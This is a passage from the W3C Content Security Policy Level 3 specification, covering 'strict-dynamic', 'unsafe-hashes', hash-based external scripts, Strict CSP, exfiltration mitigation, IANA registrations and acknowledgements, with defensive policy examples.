`'unsafe-inline' https:` in browsers that support CSP1,
`https: 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV'` in browsers that
support CSP2, and
`'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic'` in browsers
that support CSP3.

The second allows scripts which are given access to the page via nonces
or hashes to bring in their dependencies without adding them explicitly
to the page's policy.

::: {#example-78705861 .example}
[](#example-78705861){.self-link} Suppose MegaCorp, Inc. deploys the
following policy:

    Content-Security-Policy: script-src 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic'

And serves the following HTML with that policy active:

``` highlight
...
<script src="https://cdn.example.com/script.js" nonce="DhcnhD3khTMePgXwdayK9BsMqXjhguVV" ></script>
...
```

This will generate a request for `https://cdn.example.com/script.js`,
which will not be blocked because of the matching
[`nonce`](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce){#ref-for-attr-nonce②
link-type="element-sub"} attribute.

If `script.js` contains the following code:

``` highlight
var s = document.createElement('script');
s.src = 'https://othercdn.not-example.net/dependency.js';
document.head.appendChild(s);

document.write('<scr' + 'ipt src="/sadness.js"></scr' + 'ipt>');
```

`dependency.js` will load, as the
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①④
link-type="element"} element created by `createElement()` is not
[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted){#ref-for-parser-inserted⑤
link-type="dfn"}.

`sadness.js` will *not* load, however, as `document.write()` produces
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①⑤
link-type="element"} elements which are
[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted){#ref-for-parser-inserted⑥
link-type="dfn"}.
:::

[Note:]{.marker} With
[\'strict-dynamic\'](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic⑨
link-type="grammar"}, scripts created at runtime will be allowed to
execute. If the location of such a script can be controlled by an
attacker, the policy will then allow the loading of arbitrary scripts.
Developers that use
[\'strict-dynamic\'](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic①⓪
link-type="grammar"} in their policy should audit the uses of
non-parser-inserted APIs and ensure that they are not invoked with
potentially untrusted data. This includes applications or frameworks
that tend to determine script locations at runtime.

:::: section
### [8.3. ]{.secno}[ Usage of \"`'unsafe-hashes'`\" ]{.content}[](#unsafe-hashes-usage){.self-link} {#unsafe-hashes-usage .heading .settled level="8.3"}

*This section is not normative.*

Legacy websites and websites with legacy dependencies might find it
difficult to entirely externalize event handlers. These sites could
enable such handlers by allowing `'unsafe-inline'`, but that's a big
hammer with a lot of associated risk (and cannot be used in conjunction
with nonces or hashes).

The
\"[`'unsafe-hashes'`](#grammardef-unsafe-hashes){#ref-for-grammardef-unsafe-hashes②
link-type="grammar"}\" source expression aims to make CSP deployment
simpler and safer in these situations by allowing developers to enable
specific handlers via hashes.

::: {#example-02b7e69d .example}
[](#example-02b7e69d){.self-link} MegaCorp, Inc. can't quite get rid of
the following HTML on anything resembling a reasonable schedule:

``` highlight
<button id="action" onclick="doSubmit()">
```

Rather than reducing security by specifying \"`'unsafe-inline'`\", they
decide to use \"`'unsafe-hashes'`\" along with a hash source expression
corresponding to `doSubmit()`, as follows:

    Content-Security-Policy:  script-src 'unsafe-hashes' 'sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY='
:::

The capabilities `'unsafe-hashes'` provides is useful for legacy sites,
but should be avoided for modern sites. In particular, note that hashes
allow a particular script to execute, but do not ensure that it executes
in the way a developer intends. If an interesting capability is exposed
as an inline event handler (say
`<a onclick="transferAllMyMoney()">Transfer</a>`), then that script
becomes available for an attacker to inject as
`<script>transferAllMyMoney()</script>`. Developers should be careful to
balance the risk of allowing specific scripts to execute against the
deployment advantages that allowing inline event handlers might provide.
::::

:::: section
### [8.4. ]{.secno}[ Allowing external JavaScript via hashes ]{.content}[](#external-hash){.self-link} {#external-hash .heading .settled level="8.4"}

*This section is not normative.*

In
[\[CSP2\]](#biblio-csp2 "Content Security Policy Level 2"){link-type="biblio"},
hash [source
expressions](#source-expression){#ref-for-source-expression①①
link-type="dfn"} could only match inlined script, but now that
Subresource Integrity
[\[SRI\]](#biblio-sri "Subresource Integrity"){link-type="biblio"} is
widely deployed, we can expand the scope to enable externalized
JavaScript as well.

If multiple sets of integrity metadata are specified for a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①⑥
link-type="element"}, the request will match a policy's
[hash-source](#grammardef-hash-source){#ref-for-grammardef-hash-source⑨
link-type="grammar"}s if and only if *each* item in a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①⑦
link-type="element"}'s integrity metadata matches the policy.

[Note:]{.marker} The CSP spec specifies that the contents of an inline
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①⑧
link-type="element"} element or event handler needs to be encoded using
[UTF-8
encode](https://encoding.spec.whatwg.org/#utf-8-encode){#ref-for-utf-8-encode①
link-type="dfn"} before computing its hash.
[\[SRI\]](#biblio-sri "Subresource Integrity"){link-type="biblio"}
computes the hash on the raw resource that is being fetched instead.
This means that it is possible for the hash needed to allow an inline
script block to be different from the hash needed to allow an external
script even if they have identical contents.

::: {#example-af80f2fd .example}
[](#example-af80f2fd){.self-link} MegaCorp, Inc. wishes to allow two
specific scripts on a page in a way that ensures that the content
matches their expectations. They do so by setting the following policy:

    Content-Security-Policy: script-src 'sha256-abc123' 'sha512-321cba'

In the presence of that policy, the following
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①⑨
link-type="element"} elements would be allowed to execute because they
contain only integrity metadata that matches the policy:

``` highlight
<script integrity="sha256-abc123" ...></script>
<script integrity="sha512-321cba" ...></script>
<script integrity="sha256-abc123 sha512-321cba" ...></script>
```

While the following
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script②⓪
link-type="element"} elements would not execute because they contain
valid metadata that does not match the policy (even though other
metadata does match):

``` highlight
<script integrity="sha384-xyz789" ...></script>
<script integrity="sha384-xyz789 sha512-321cba" ...></script>
<script integrity="sha256-abc123 sha384-xyz789 sha512-321cba" ...></script>
```

Metadata that is not recognized (either because it's entirely invalid,
or because it specifies a not-yet-supported hashing algorithm) does not
affect the behavior described here. That is, the following elements
would be allowed to execute in the presence of the above policy, as the
additional metadata is invalid and therefore wouldn't allow a script
whose content wasn't listed explicitly in the policy to execute:

``` highlight
<script integrity="sha256-abc123 sha1024-abcd" ...></script>
<script integrity="sha512-321cba entirely-invalid" ...></script>
<script integrity="sha256-abc123 not-a-hash-at-all sha512-321cba" ...></script>
```
:::
::::

:::: section
### [8.5. ]{.secno}[ Strict CSP ]{.content}[](#strict-csp){.self-link} {#strict-csp .heading .settled level="8.5"}

*This section is not normative.*

Deployment of an effective CSP against XSS is a challenge (as described
in [CSP Is Dead, Long Live
CSP!](https://dl.acm.org/doi/10.1145/2976749.2978363)
[\[LONG-LIVE-CSP\]](#biblio-long-live-csp "CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"){link-type="biblio"}).
However, enforcing the following set of CSP directives has been
identified as an effective and deployable mitigation against XSS.

1.  *script-src*: Only use *nonce*
    [source-expression](#grammardef-source-expression){#ref-for-grammardef-source-expression②
    link-type="grammar"} and/or *hash*
    [source-expression](#grammardef-source-expression){#ref-for-grammardef-source-expression③
    link-type="grammar"} with the
    \"[\'strict-dynamic\'](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic①①
    link-type="grammar"}\"
    [keyword-source](#grammardef-keyword-source){#ref-for-grammardef-keyword-source⑨
    link-type="grammar"}.

    [Note:]{.marker} While
    \"[\'strict-dynamic\'](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic①②
    link-type="grammar"}\" allows ease of deployment (as described in
    [§ 8.2 Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage)), it
    should be avoided when possible.

    [Note:]{.marker} For backwards compatibility, it is recommended to
    specify *https:*
    [scheme-source](#grammardef-scheme-source){#ref-for-grammardef-scheme-source⑤
    link-type="grammar"} with
    \"[\'strict-dynamic\'](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic①③
    link-type="grammar"}\".

2.  *base-uri*: Specify a value of either
    \"[\'self\'](#grammardef-self){#ref-for-grammardef-self③⓪
    link-type="grammar"}\" or
    \"[\'none\'](#grammardef-none){#ref-for-grammardef-none②
    link-type="grammar"}\".

A CSP that meets the above criteria is called Strict CSP. Further
details are discussed in
[\[WEBDEV-STRICTCSP\]](#biblio-webdev-strictcsp "Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)"){link-type="biblio"}.

::: {#example-ad7af9dc .example}
[](#example-ad7af9dc){.self-link} The following are examples of Strict
CSP:

Nonce-based Strict CSP:

    Content-Security-Policy: script-src 'strict-dynamic' 'nonce-{RANDOM}'; base-uri 'self';

Hash-based Strict CSP:

    Content-Security-Policy: script-src 'strict-dynamic' 'sha256-{HASHED_INLINE_SCRIPT}'; base-uri 'self';
:::
::::

::::: section
### [8.6. ]{.secno}[ Exfiltration ]{.content}[](#exfiltration){.self-link} {#exfiltration .heading .settled level="8.6"}

*This section is not normative.*

Data exfiltration can occur when the contents of the request, such as
the URL, contain information about the user or page that should be
restricted and not shared.

Content Security Policy can mitigate data exfiltration if used to create
allowlists of servers with which a page is allowed to communicate. Note
that a policy which lacks the
[default-src](#default-src){#ref-for-default-src⑥ link-type="dfn"}
directive cannot mitigate exfiltration, as there are kinds of requests
that are not addressable through a more-specific directive
([`prefetch`](https://html.spec.whatwg.org/#link-type-prefetch){#ref-for-link-type-prefetch①
link-type="attr-value"}, for example).
[\[HTML\]](#biblio-html "HTML Standard"){link-type="biblio"}

::: {#example-ae46ad12 .example}
[](#example-ae46ad12){.self-link} In the following example, a policy
with draconian restrictions on images, fonts, and scripts can still
allow data exfiltration via other request types (`fetch()`,
[`prefetch`](https://html.spec.whatwg.org/#link-type-prefetch){#ref-for-link-type-prefetch②
link-type="attr-value"}, etc):
[\[HTML\]](#biblio-html "HTML Standard"){link-type="biblio"}

    Content-Security-Policy: img-src 'none'; script-src 'none'; font-src 'none'

Supplementing this policy with `default-src 'none'` would improve the
page's robustness against this kind of attack.
:::

::: {#example-d969ae08 .example}
[](#example-d969ae08){.self-link} In the following example, the
[default-src](#default-src){#ref-for-default-src⑦ link-type="dfn"}
directive appears to protect from exfiltration, however the
[img-src](#img-src){#ref-for-img-src④ link-type="dfn"} directive relaxes
this restriction by using a wildcard, which allows data exfiltration to
arbitrary endpoints. A policy's exfiltration mitigation ability depends
upon the least-restrictive directive allowlist:

    Content-Security-Policy: default-src 'none'; img-src *
:::
:::::

::: section
## [9. ]{.secno}[Implementation Considerations]{.content}[](#implementation-considerations){.self-link} {#implementation-considerations .heading .settled level="9"}

### [9.1. ]{.secno}[Vendor-specific Extensions and Addons]{.content}[](#extensions){.self-link} {#extensions .heading .settled level="9.1"}

[Policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦⑦
link-type="dfn"} enforced on a resource SHOULD NOT interfere with the
operation of user-agent features like addons, extensions, or
bookmarklets. These kinds of features generally advance the user's
priority over page authors, as espoused in
[\[HTML-DESIGN\]](#biblio-html-design "HTML Design Principles"){link-type="biblio"}.

Moreover, applying CSP to these kinds of features produces a substantial
amount of noise in violation reports, significantly reducing their value
to developers.

Chrome, for example, excludes the `chrome-extension:` scheme from CSP
checks, and does some work to ensure that extension-driven injections
are allowed, regardless of a page's policy.
:::

::: section
## [10. ]{.secno}[IANA Considerations]{.content}[](#iana-considerations){.self-link} {#iana-considerations .heading .settled level="10"}

### [10.1. ]{.secno}[ Directive Registry ]{.content}[](#iana-registry){.self-link} {#iana-registry .heading .settled level="10.1"}

The Content Security Policy Directive registry should be updated with
the following directives and references
[\[RFC7762\]](#biblio-rfc7762 "Initial Assignment for the Content Security Policy Directives Registry"){link-type="biblio"}:

[`base-uri`](#base-uri){#ref-for-base-uri② link-type="dfn"}

:   This document (see [§ 6.3.1 base-uri](#directive-base-uri))

[`child-src`](#child-src){#ref-for-child-src① link-type="dfn"}

:   This document (see [§ 6.1.1 child-src](#directive-child-src))

[`connect-src`](#connect-src){#ref-for-connect-src③ link-type="dfn"}

:   This document (see [§ 6.1.2 connect-src](#directive-connect-src))

[`default-src`](#default-src){#ref-for-default-src⑧ link-type="dfn"}

:   This document (see [§ 6.1.3 default-src](#directive-default-src))

[`font-src`](#font-src){#ref-for-font-src④ link-type="dfn"}

:   This document (see [§ 6.1.4 font-src](#directive-font-src))

[`form-action`](#form-action){#ref-for-form-action link-type="dfn"}

:   This document (see [§ 6.4.1 form-action](#directive-form-action))

[`frame-ancestors`](#frame-ancestors){#ref-for-frame-ancestors⑤ link-type="dfn"}

:   This document (see [§ 6.4.2
    frame-ancestors](#directive-frame-ancestors))

[`frame-src`](#frame-src){#ref-for-frame-src③ link-type="dfn"}

:   This document (see [§ 6.1.5 frame-src](#directive-frame-src))

[`img-src`](#img-src){#ref-for-img-src⑤ link-type="dfn"}

:   This document (see [§ 6.1.6 img-src](#directive-img-src))

[`manifest-src`](#manifest-src){#ref-for-manifest-src③ link-type="dfn"}

:   This document (see [§ 6.1.7 manifest-src](#directive-manifest-src))

[`media-src`](#media-src){#ref-for-media-src③ link-type="dfn"}

:   This document (see [§ 6.1.8 media-src](#directive-media-src))

[`object-src`](#object-src){#ref-for-object-src④ link-type="dfn"}

:   This document (see [§ 6.1.9 object-src](#directive-object-src))

[`report-uri`](#report-uri){#ref-for-report-uri④ link-type="dfn"}

:   This document (see [§ 6.5.1 report-uri](#directive-report-uri))

[`report-to`](#report-to){#ref-for-report-to⑤ link-type="dfn"}

:   This document (see [§ 6.5.2 report-to](#directive-report-to))

[`sandbox`](#sandbox){#ref-for-sandbox③ link-type="dfn"}

:   This document (see [§ 6.3.2 sandbox](#directive-sandbox))

[`script-src`](#script-src){#ref-for-script-src⑤ link-type="dfn"}

:   This document (see [§ 6.1.10 script-src](#directive-script-src))

[`script-src-attr`](#script-src-attr){#ref-for-script-src-attr⑤ link-type="dfn"}

:   This document (see [§ 6.1.12
    script-src-attr](#directive-script-src-attr))

[`script-src-elem`](#script-src-elem){#ref-for-script-src-elem⑤ link-type="dfn"}

:   This document (see [§ 6.1.11
    script-src-elem](#directive-script-src-elem))

[`style-src`](#style-src){#ref-for-style-src① link-type="dfn"}

:   This document (see [§ 6.1.13 style-src](#directive-style-src))

[`style-src-attr`](#style-src-attr){#ref-for-style-src-attr② link-type="dfn"}

:   This document (see [§ 6.1.15
    style-src-attr](#directive-style-src-attr))

[`style-src-elem`](#style-src-elem){#ref-for-style-src-elem② link-type="dfn"}

:   This document (see [§ 6.1.14
    style-src-elem](#directive-style-src-elem))

[`worker-src`](#worker-src){#ref-for-worker-src④ link-type="dfn"}

:   This document (see [§ 6.2.2 worker-src](#directive-worker-src))

### [10.2. ]{.secno}[ Headers ]{.content}[](#iana-headers){.self-link} {#iana-headers .heading .settled level="10.2"}

The permanent message header field registry should be updated with the
following registrations:
[\[RFC3864\]](#biblio-rfc3864 "Registration Procedures for Message Header Fields"){link-type="biblio"}

#### [10.2.1. ]{.secno}[Content-Security-Policy]{.content}[](#iana-csp){.self-link} {#iana-csp .heading .settled level="10.2.1"}

Header field name
:   Content-Security-Policy

Applicable protocol
:   http

Status
:   standard

Author/Change controller
:   W3C

Specification document
:   This specification (See [§ 3.1 The Content-Security-Policy HTTP
    Response Header Field](#csp-header))

#### [10.2.2. ]{.secno}[Content-Security-Policy-Report-Only]{.content}[](#iana-cspro){.self-link} {#iana-cspro .heading .settled level="10.2.2"}

Header field name
:   Content-Security-Policy-Report-Only

Applicable protocol
:   http

Status
:   standard

Author/Change controller
:   W3C

Specification document
:   This specification (See [§ 3.2 The
    Content-Security-Policy-Report-Only HTTP Response Header
    Field](#cspro-header))
:::

::: section
## [11. ]{.secno}[Acknowledgements]{.content}[](#acknowledgements){.self-link} {#acknowledgements .heading .settled level="11"}

Lots of people are awesome. For instance:

- Mario and all of Cure53.

- Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, Jochen Eisinger,
  and the rest of Google's CSP Cabal.
:::
:::::::::::::::::
